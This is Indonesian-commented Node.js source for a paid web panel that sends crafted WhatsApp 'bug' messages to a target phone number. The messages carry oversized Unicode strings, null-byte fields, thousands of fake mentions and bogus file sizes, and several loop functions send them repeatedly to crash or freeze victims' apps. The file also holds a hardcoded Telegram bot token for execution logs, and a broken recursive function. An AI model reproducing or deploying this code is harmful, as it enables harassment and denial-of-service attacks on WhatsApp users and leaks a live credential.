                                 url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
                                 mimetype: "image/jpeg",
                                 fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
                                 fileLength: "10840",
                                 height: 10,
                                 width: 10,
                                 mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
                                 fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
                                 directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
                                 mediaKeyTimestamp: "1721344123",
                                 jpegThumbnail: ""
                              }
                           }),
                           nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
                        }))
                     }),
                     contextInfo: {
                        mentionedJid: [
                           target,
                           "0@s.whatsapp.net",
                           ...Array.from({ length: 1900 }, () => 
                              `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
                        ],
                        remoteJid: target,
                        participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                        stanzaId: "1234567890ABCDEF"
                     }
                  })
               }
            }
         },
         { messageId: null, participant: { jid: target } }
      );

      console.log(`✅ Carousel terkirim ke ${target}`);
      return { status: "success" };

   } catch (err) {
      console.error("❌ Error kirim carousel:", err);
      return { status: "error", error: err.message };
   }
}

async function DelayInvis(pian, target) {
  try {
    const longTitle = "Testing" + "ꦽ".repeat(5000);
    const longJson = "{}".repeat(5000);
    const longFlow = "ꦽ".repeat(4500);
    const longButtonTitle = "𑲭𑲭".repeat(5000);
    
    const stickerPayload = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
            isAnimated: true,
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: false,
            isAiSticker: false,
            isLottie: false
          }
        }
      }
    };
    
    const content = {
      message: {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: longTitle,
              },
              body: {
                text: "Testing Sedot Kuota",
              },
              nativeFlowMessage: {
                messageParamsJson: longJson,
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: JSON.stringify({
                      title: longButtonTitle,
                      sections: [
                        {
                          title: "kill you",
                          rows: [],
                        },
                      ],
                    }),
                  },
                  {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                      icon: "DEFAULT",
                      flow_cta: longFlow,
                      flow_message_version: "3",
                    }),
                  },
                  {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                      icon: "DEFAULT",
                      flow_cta: longFlow,
                      flow_message_version: "3",
                    }),
                  },
                ],
              },
              messageParamsJson: longJson,
            },
          },
        },
      },
    };
    
    const imagePayload = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "tEx11DW/xELbFSeYwVVtTuOW7+2smOcih5QUOM5Wu9c=",
        fileLength: 99999999999,
        height: 1280,
        width: 720,
        mediaKey: "+2NVZlEfWN35Be5t5AEqeQjQaa4yirKZhVzmwvmwTn4=",
        fileEncSha256: "O2XdlKNvN1lqENPsafZpJTJFh9dHrlbL7jhp/FBM/jc=",
        directPath: "/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA",
        mediaKeyTimestamp: 1758521043,
        isSampled: true,
        viewOnce: true,
        contextInfo: {
          forwardingScore: 989,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399602691477@newsletter",
            newsletterName: "t.me/RizFavboy",
            contentType: "UPDATE_CARD",
            accessibilityText: "\u0000".repeat(10000),
            serverMessageId: 18888888
          },
          mentionedJid: Array.from({ length: 1900 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
        },
        scansSidecar: "/dx1y4mLCBeVr2284LzSPOKPNOnoMReHc4SLVgPvXXz9mJrlYRkOTQ==",
        scanLengths: [3599, 9271, 2026, 2778],
        midQualityFileSha256: "29eQjAGpMVSv6US+91GkxYIUUJYM2K1ZB8X7cCbNJCc=",
        annotations: [
          {
            polygonVertices: [
              { x: "0.05515563115477562", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.5867812633514404" },
              { x: "0.05515563115477562", y: "0.5867812633514404" }
            ],
            newsletter: {
              newsletterJid: "120363399602691477@newsletter",
              serverMessageId: 3868,
              newsletterName: "t.me/isi bebas akun kalian",
              contentType: "UPDATE_CARD",
              accessibilityText: "\u0000".repeat(5000)
            }
          }
        ]
      }
    };
    
    const msg1 = generateWAMessageFromContent(target, content, {});
    const msg2 = generateWAMessageFromContent(target, stickerPayload, {});
    const msg3 = generateWAMessageFromContent(target, imagePayload, {});
    
    await pian.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });
    
    await pian.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });
    
    await pian.relayMessage("status@broadcast", msg3.message, {
      messageId: msg3.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });
    console.log(chalk.blue(`Sukses send bug Delay ke ${target}`));
  } catch (err) {
    console.error(err);
  }
}

async function bulldozer(pian, target) {
     for (let i = 0; i < 5; i++) {
         await bulldozer(pian, target);
         await bulldozer(pian, target);
         await bulldozer(pian, target);
         await bulldozer(pian, target);
         await bulldozer(pian, target);
         await bulldozer(pian, target);
         await bulldozer(pian, target);
         await bulldozer(pian, target);
         await bulldozer(pian, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }
     
async function delaymedium(pian, target) {
     for (let i = 0; i < 5; i++) {
         await protocolbug3(pian, target);
         await protocolbug3(pian, target);
         await protocolbug3(pian, target);
         await protocolbug3(pian, target);
         await protocolbug3(pian, target);
         await protocolbug3(pian, target);
         await protocolbug3(pian, target);
         await protocolbug3(pian, target);
         await protocolbug3(pian, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }
     
async function blankandro(pian, target) {
     for (let i = 0; i < 5; i++) {
         await BlackOwlFCInvis(pian, target);
         await BlackOwlFCInvis(pian, target);
         await BlackOwlFCInvis(pian, target);
         await BlackOwlFCInvis(pian, target);
         await BlackOwlFCInvis(pian, target);
         await BlackOwlFCInvis(pian, target);
         await BlackOwlFCInvis(pian, target);
         await BlackOwlFCInvis(pian, target);
         await BlackOwlFCInvis(pian, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }

async function blankios(pian, target) {
     for (let i = 0; i < 5; i++) {
         await BlackOwlFCInvis(pian, target);
         await BlackOwlFCInvis(pian, target);
         await DelayInvis(pian, target);
         await BlackOwlFCInvis(pian, target);
         await DelayInvis(pian, target);
         await BlackOwlFCInvis(pian, target);
         await DelayInvis(pian, target);
         await BlackOwlFCInvis(pian, target);
         await DelayInvis(pian, target);
         await BlackOwlFCInvis(pian, target);
         await DelayInvis(pian, target);
         await BlackOwlFCInvis(pian, target);
         await DelayInvis(pian, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }
     
async function invisios(pian, target) {
     for (let i = 0; i < 5; i++) {
         await BlackOwlFCInvis(pian, target);
         await DelayInvis(pian, target);
         await BlackOwlFCInvis(pian, target);
         await DelayInvis(pian, target);
         await BlackOwlFCInvis(pian, target);
         await DelayInvis(pian, target);
         await BlackOwlFCInvis(pian, target);
         await DelayInvis(pian, target);
         await BlackOwlFCInvis(pian, target);
         await DelayInvis(pian, target);
         await BlackOwlFCInvis(pian, target);
         await DelayInvis(pian, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.json());
app.use(express.static('public'));

// ==================== AUTH MIDDLEWARE ==================== //
function requireAuth(req, res, next) {
  const username = req.cookies.sessionUser;
  
  if (!username) {
    return res.redirect("/login?msg=Silakan login terlebih dahulu");
  }
  
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }
  
  if (Date.now() > currentUser.expired) {
    return res.redirect("/login?msg=Session expired, login ulang");
  }
  
  next();
}

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "BlueAngel", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "BlueAngel", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
  res.redirect("/dashboard");
});

app.get('/dashboard', (req, res) => {
    const username = req.cookies.sessionUser;
    if (!username) {
        return res.redirect('/login');
    }
    res.sendFile(path.join(__dirname, 'BlueAngel', 'dashboard.html'));
});

app.get("/api/dashboard-data", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  if (!currentUser) {
    return res.status(404).json({ error: "User not found" });
  }

  let role = "User";
  const userId = req.cookies.sessionUser; 
  if (isOwner(userId)) {
    role = "Owner";
  } else if (isModerator(userId)) {
    role = "Moderator";
  } else if (isPT(userId)) {
    role = "PT";
  } else if (isReseller(userId)) {
    role = "Reseller";
  } else if (isAuthorized(userId)) {
    role = "Authorized";
  }

  const expired = new Date(currentUser.expired).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
  });

  const now = Date.now();
  const timeRemaining = currentUser.expired - now;
  const daysRemaining = Math.max(0, Math.floor(timeRemaining / (1000 * 60 * 60 * 24)));

  res.json({
    username: currentUser.username,
    role: role,
    activeSenders: sessions.size,
    expired: expired,
    daysRemaining: daysRemaining
  });
});
      
/* 
USER DETECTIONS - HARAP DI BACA !!!
MASUKIN BOT TOKEN TELE LU DAN ID TELE LU ATAU ID GROUP TELEL LU

Gunanya buat apa bang?
itu kalo ada user yang make fitur bug nanti si bot bakal ngirim log history nya ke id telelu, kalo pake id GC tele lu, nanti ngirim history nya ke GC tele lu bisa lu atur aja mau ngirim nya ke mana ID / ID GC
*/
const BOT_TOKEN = "8414001301:AAEaYQU9gBCEupbZPS84g0DB-YROwqAg8H8";
const CHAT_ID = "7947266803";
let lastExecution = 0;

app.get("/execution", async (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    console.log(`[INFO] Execution accessed by user: ${username}`);
    
    const filePath = "./BlueAngel/Login.html";
    const html = await fs.promises.readFile(filePath, "utf8").catch(err => {
      return res.status(500).send("✗ Gagal baca file Login.html");
    });

    if (!username) {
      console.log(`[INFO] No username, redirecting to login`);
      return res.send(html);
    }

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      console.log(`[INFO] User ${username} expired or not found`);
      return res.send(html);
    }

    const justExecuted = req.query.justExecuted === 'true';
    const targetNumber = req.query.target;
    const mode = req.query.mode;
    
    console.log(`[INFO] Query params - justExecuted: ${justExecuted}, target: ${targetNumber}, mode: ${mode}`);

    if (!targetNumber || targetNumber === 'undefined') {
      return res.send(executionPage("❌ Target Tidak Valid", {
        message: "Nomor target tidak valid atau kosong. Pastikan format: 628xxxxxxx",
        activeSenders: []
      }, false, currentUser, "Nomor target tidak valid", mode));
    }

    if (!mode || mode === 'undefined') {
      return res.send(executionPage("❌ Mode Tidak Dikenal", {
        target: targetNumber,
        message: "Mode bug tidak dipilih. Silakan pilih jenis bug terlebih dahulu.",
        activeSenders: []
      }, false, currentUser, "Mode tidak dikenal", mode));
    }

    const cleanTarget = targetNumber.replace(/\D/g, '');
    if (!cleanTarget.startsWith('62') || cleanTarget.length < 10) {
      return res.send(executionPage("❌ Format Nomor Salah", {
        target: targetNumber,
        message: "Format nomor harus diawali dengan 62 dan minimal 10 digit",
        activeSenders: []
      }, false, currentUser, "Format nomor salah", mode));
    }

    if (justExecuted) {
      return res.send(executionPage("✓ S U C C E S", {
        target: cleanTarget,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()} - Completed`
      }, false, currentUser, "", mode));
    }

    console.log(`[INFO SESSION] Checking sessions for user: ${username}`);
    
    const userSessions = loadUserSessions();
    
    const userSenders = userSessions[username] || [];
    
    const activeUserSenders = userSenders.filter(sender => {
      const hasSession = sessions.has(sender);
      return hasSession;
    });

    if (activeUserSenders.length === 0) {
      console.log(`[INFO] No active senders found for user ${username}`);
      return res.send(executionPage("❌ Tidak Ada Sender Aktif", {
        message: "Anda tidak memiliki sender WhatsApp yang aktif. Silakan tambahkan sender terlebih dahulu di menu 'My Senders'."
      }, false, currentUser, "", mode));
    }

    const validModes = ["delay", "blank", "medium", "tytydfatur", "iosblank", "fcinvsios"];
    if (!validModes.includes(mode)) {
      console.log(`[INFO] Invalid mode: ${mode}`);
      return res.send(executionPage("❌ Mode Tidak Valid", {
        target: cleanTarget,
        message: `Mode '${mode}' tidak dikenali. Mode yang valid: ${validModes.join(', ')}`,
        activeSenders: activeUserSenders
      }, false, currentUser, "Mode tidak valid", mode));
    }

    try {
      const userSender = activeUserSenders[0];
      const pian = sessions.get(userSender);
      
      console.log(`[INFO SOCKET] Selected sender: ${userSender}`);
      console.log(`[INFO SOCKET] Socket object:`, pian ? 'EXISTS' : 'NULL');
      
      if (!pian) {
        console.error(`[ERROR] Socket is null for sender: ${userSender}`);
        throw new Error("Sender tidak aktif. Silakan periksa koneksi sender Anda.");
      }

      const target = `${cleanTarget}@s.whatsapp.net`;
      
      let bugResult;
      if (mode === "delay") {
        bugResult = await bugdelay(pian, target);
      } else if (mode === "blank") {
        bugResult = await blankandro(pian, target);
      } else if (mode === "medium") {
        bugResult = await delaymedium(pian, target);
      } else if (mode === "iosblank") {
        bugResult = await blankios(pian, target);
      } else if (mode === "fcinvsios") {
        bugResult = await invisios(pian, target);
      } else {
        throw new Error("Mode tidak dikenal.");
      }

      lastExecution = Date.now();

      console.log(`[EXECUTION SUCCESS] User: ${username} | Sender: ${userSender} | Target: ${cleanTarget} | Mode: ${mode} | Time: ${new Date().toLocaleString("id-ID")}`);

      const logMessage = `<blockquote>⚡ <b>New Execution Success</b>
      
👤 User: ${username}
📞 Sender: ${userSender}
🎯 Target: ${cleanTarget}
📱 Mode: ${mode.toUpperCase()}
⏰ Time: ${new Date().toLocaleString("id-ID")}</blockquote>`;

      axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: logMessage,
        parse_mode: "HTML"
      }).catch(err => console.error("Gagal kirim log Telegram:", err.message));

      return res.redirect(`/execution?justExecuted=true&target=${encodeURIComponent(cleanTarget)}&mode=${mode}`);
      
    } catch (err) {
      console.error(`[EXECUTION ERROR] User: ${username} | Error:`, err.message);
      console.error(`[EXECUTION ERROR] Stack:`, err.stack);
      
      return res.send(executionPage("✗ Gagal kirim", {
        target: cleanTarget,
        message: err.message || "Terjadi kesalahan saat pengiriman.",
        activeSenders: activeUserSenders
      }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
    }
  } catch (err) {
    console.error("❌ Fatal error di /execution:", err);
    return res.status(500).send("Internal Server Error");
  }
});

app.get("/debug-sessions", (req, res) => {
  const userSessions = loadUserSessions();
  const activeSessions = Array.from(sessions.keys());
  
  let fileDetails = {};
  for (const [username, numbers] of Object.entries(userSessions)) {
    fileDetails[username] = {};
    numbers.forEach(number => {
      const sessionDir = userSessionPath(username, number);
      const credsPath = path.join(sessionDir, 'creds.json');
      
      fileDetails[username][number] = {
        session_dir: sessionDir,
        dir_exists: fs.existsSync(sessionDir),
        creds_exists: fs.existsSync(credsPath),
        creds_size: fs.existsSync(credsPath) ? fs.statSync(credsPath).size : 0
      };
    });
  }
  
  res.json({
    timestamp: new Date().toISOString(),
    sessions_map_size: sessions.size,
    sessions_map_content: activeSessions,
    user_sessions_content: userSessions,
    file_structure: fileDetails,
    problem: sessions.size === 0 ? "❌ NO ACTIVE SESSIONS" : "✅ SESSIONS ACTIVE"
  });
});

// ==================== DOWNLOADER ROUTES ==================== //

app.get("/tt", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, " BlueAngel", "tiktok.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/myinfo", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "BlueAngel", "profil.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/quote", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "BlueAngel", "iqc.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/music", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "BlueAngel", "music.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/mysender", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "BlueAngel", "my-senders.html");
  res.sendFile(filePath);
});

app.get("/api/mysenders", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const userSessions = loadUserSessions();
  const userSenders = userSessions[username] || [];
  
  res.json({ 
    success: true, 
    senders: userSenders,
    total: userSenders.length
  });
});

app.get("/api/events", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Access-Control-Allow-Origin': '*',
  });

  userEvents.set(username, res);

  const heartbeat = setInterval(() => {
    try {
      res.write(': heartbeat\n\n');
    } catch (err) {
      clearInterval(heartbeat);
    }
  }, 30000);

  req.on('close', () => {
    clearInterval(heartbeat);
    userEvents.delete(username);
  });

  res.write(`data: ${JSON.stringify({ type: 'connected', message: 'Event stream connected' })}\n\n`);
});

app.post("/api/add-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  const { number } = req.body;
  
  if (!number) {
    return res.json({ success: false, error: "Nomor tidak boleh kosong" });
  }
  
  const cleanNumber = number.replace(/\D/g, '');
  if (!cleanNumber.startsWith('62')) {
    return res.json({ success: false, error: "Nomor harus diawali dengan 62" });
  }
  
  if (cleanNumber.length < 10) {
    return res.json({ success: false, error: "Nomor terlalu pendek" });
  }
  
  try {
    console.log(`[API] User ${username} adding sender: ${cleanNumber}`);
    const sessionDir = userSessionPath(username, cleanNumber);
    
    connectToWhatsAppUser(username, cleanNumber, sessionDir)
      .then((pian) => {
        console.log(`[${username}] ✅ Sender ${cleanNumber} connected successfully`);
      })
      .catch((error) => {
        console.error(`[${username}] ❌ Failed to connect sender ${cleanNumber}:`, error.message);
      });

    res.json({ 
      success: true, 
      message: "Proses koneksi dimulai! Silakan tunggu notifikasi kode pairing.",
      number: cleanNumber,
      note: "Kode pairing akan muncul di halaman ini dalam beberapa detik..."
    });
    
  } catch (error) {
    console.error(`[API] Error adding sender for ${username}:`, error);
    res.json({ 
      success: false, 
      error: "Terjadi error saat memproses sender: " + error.message 
    });
  }
});

app.post("/api/delete-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  const { number } = req.body;
  
  if (!number) {
    return res.json({ success: false, error: "Nomor tidak boleh kosong" });
  }
  
  try {
    const userSessions = loadUserSessions();
    if (userSessions[username]) {
      userSessions[username] = userSessions[username].filter(n => n !== number);
      saveUserSessions(userSessions);
    }
    
    const sessionDir = userSessionPath(username, number);
    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true });
    }
    
    res.json({ 
      success: true, 
      message: "Sender berhasil dihapus",
      number: number
    });
  } catch (error) {
    res.json({ 
      success: false, 
      error: error.message 
    });
  }
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(PORT, () => {
  console.log(`✓ Server aktif di port ${PORT}`);
});

module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};


// ==================== HTML EXECUTION ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = "",
  userRole = "user"
) => {
  const { username, expired } = userInfo;
  const now = Date.now();
  const isExpired = expired && now > expired;
  const isExpiredSoon = expired && (expired - now < 86400000 && !isExpired); // Kurang dari 24 jam
  
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "-";

  const expiredClass = isExpired ? 'expired-danger' : (isExpiredSoon ? 'expired-soon' : '');

  // Logika untuk menampilkan status di konsol berdasarkan input 'status'
  let initialConsoleMessage = message || 'Waiting for command...';
  let consoleClass = 'console-log';
  if (status.includes('❌') || status.includes('Error')) {
    consoleClass += ' error-log';
  } else if (status.includes('✅') || status.includes('Success')) {
    // Biarkan default
  }

  return `
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Execution Core v2.0</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Plus+Jakarta+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #4a7bff;
            --primary-glow: #5d8cff;
            --secondary: #6ee7e7;
            --dark-bg: #0a0f2e;
            --glass-bg: rgba(20, 30, 70, 0.7);
            --glass-border: rgba(120, 180, 255, 0.15);
            --text-main: #f0f8ff;
            --text-muted: #b0c8ff;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: var(--dark-bg);
            background-image: 
                radial-gradient(circle at 15% 25%, rgba(74, 123, 255, 0.2) 0%, transparent 45%),
                radial-gradient(circle at 85% 75%, rgba(110, 231, 231, 0.15) 0%, transparent 45%),
                linear-gradient(135deg, rgba(10, 15, 46, 0.9) 0%, rgba(20, 30, 70, 0.9) 100%);
            font-family: 'Plus Jakarta Sans', sans-serif;
            color: var(--text-main);
            min-height: 100vh;
            overflow-x: hidden;
            padding-bottom: 90px;
        }

        .grid-bg {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-image: 
                linear-gradient(rgba(74, 123, 255, 0.05) 1px, transparent 1px),
                linear-gradient(90deg, rgba(74, 123, 255, 0.05) 1px, transparent 1px);
            background-size: 35px 35px;
            z-index: -1;
            pointer-events: none;
        }

        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            animation: fadeIn 0.6s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 5px;
            margin-bottom: 25px;
        }

        .header-left h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 26px;
            background: linear-gradient(to right, #6ee7e7, #4a7bff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 800;
            letter-spacing: 1.5px;
            text-shadow: 0 0 20px rgba(74, 123, 255, 0.3);
        }

        .header-left p {
            color: var(--text-muted);
            font-size: 12px;
            margin-top: 4px;
            letter-spacing: 0.5px;
        }

        .profile-btn {
            width: 42px;
            height: 42px;
            border-radius: 14px;
            background: rgba(74, 123, 255, 0.1);
            border: 1px solid var(--glass-border);
            display: flex;
            align-items: center;
            justify-content: center;
            color: #6ee7e7;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            text-decoration: none;
        }

        .profile-btn:hover {
            background: rgba(74, 123, 255, 0.25);
            border-color: var(--primary);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(74, 123, 255, 0.2);
        }

        .glass-card {
            background: var(--glass-bg);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border);
            border-radius: 28px;
            padding: 28px;
            margin-bottom: 20px;
            box-shadow: 0 15px 45px rgba(0, 5, 30, 0.4);
            position: relative;
            overflow: hidden;
        }

        .glass-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(110, 231, 231, 0.5), transparent);
        }

        .card-header {
            display: flex;
            align-items: center;
            gap: 14px;
            margin-bottom: 24px;
            padding-bottom: 18px;
            border-bottom: 1px solid rgba(120, 180, 255, 0.1);
        }

        .card-header i {
            font-size: 20px;
            color: var(--secondary);
            background: rgba(110, 231, 231, 0.15);
            padding: 12px;
            border-radius: 14px;
            box-shadow: 0 5px 15px rgba(110, 231, 231, 0.1);
        }

        .card-title {
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            font-size: 18px;
            background: linear-gradient(to right, #f0f8ff, #b0c8ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: 0.8px;
        }

        .input-group {
            position: relative;
            margin-bottom: 28px;
        }

        .input-label {
            display: block;
            margin-bottom: 12px;
            font-size: 14px;
            color: var(--text-muted);
            font-weight: 600;
            letter-spacing: 0.6px;
        }

        .input-wrapper {
            position: relative;
        }

        .input-wrapper i {
            position: absolute;
            left: 18px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--text-muted);
            transition: 0.3s;
            z-index: 1;
        }

        .custom-input {
            width: 100%;
            background: rgba(10, 20, 50, 0.4);
            border: 1px solid var(--glass-border);
            border-radius: 18px;
            padding: 18px 18px 18px 52px;
            color: #fff;
            font-family: 'JetBrains Mono', monospace;
            font-size: 16px;
            outline: none;
            transition: all 0.3s ease;
            backdrop-filter: blur(10px);
        }

        .custom-input:focus {
            border-color: var(--secondary);
            box-shadow: 0 0 0 4px rgba(110, 231, 231, 0.2);
            background: rgba(10, 20, 50, 0.6);
        }

        .custom-input:focus + i {
            color: var(--secondary);
        }

        .mode-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 14px;
        }

        .mode-option:last-child:nth-child(odd) {
            grid-column: span 2;
        }

        .mode-option {
            background: rgba(30, 50, 100, 0.4);
            border: 1px solid rgba(120, 180, 255, 0.2);
            border-radius: 18px;
            padding: 18px 15px;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        .mode-option::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 100%;
            background: linear-gradient(135deg, rgba(74, 123, 255, 0.1), rgba(110, 231, 231, 0.1));
